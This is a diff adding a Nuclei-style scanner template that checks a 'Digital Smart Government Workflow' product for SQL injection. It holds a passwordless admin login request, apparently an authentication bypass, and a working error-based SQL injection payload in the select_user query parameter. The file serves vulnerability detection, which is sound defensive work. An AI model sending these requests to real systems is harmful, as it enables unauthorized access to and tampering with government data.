@@ -1,0 +1,58 @@
+id: poc-yaml-szt-smart-governmet-query-index-sqli
+info:
+  name: Digital Smart Government Workflow SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /portal/default/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userID=admin&flag=rone
+    matchers:
+      - type: status
+        status:
+          - 302
+    extractors:
+      - type: regex
+        name: cookie1
+        internal: true
+        part: header
+        regex:
+          - "GOASESSID=(.*?);"
+      - type: regex
+        name: cookie2
+        internal: true
+        part: header
+        regex:
+          - " (.*?); expires"
+  - raw:
+      - |
+        GET /workflow/query/index?WfRtApplication%5Bselect_user%5D=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71786b7a71%2C%28SELECT%20%28ELT%285761=5761%2C1%29%29%29%2C0x7162717871%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GOASESSID={{cookie1}};{{cookie2}}
+        X-Requested-With: XMLHttpRequest
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "'qxkzq1qbqxqx'"
+        part: body
+      - type: word
+        words:
+          - "SQLSTATE"
+        part: body
+      - type: word
+        words:
+          - "CDbCommand"
+        part: body
+      - type: word
+        words:
+          - "PHP Error"
+        part: body
